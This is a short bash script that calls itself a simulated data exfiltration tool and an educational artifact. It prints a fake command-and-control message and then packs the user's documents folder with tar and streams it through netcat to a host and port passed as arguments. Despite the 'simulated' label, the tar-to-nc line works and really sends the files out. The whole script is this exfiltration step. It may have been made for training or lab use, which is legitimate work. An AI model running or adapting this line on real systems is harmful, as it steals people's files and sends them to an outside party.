#!/bin/bash
# Simulated data exfiltration tool — educational artifact
# In a real case this would be a compiled binary
echo "Connecting to C2..."
tar czf - /home/user/documents/ | nc $1 $2


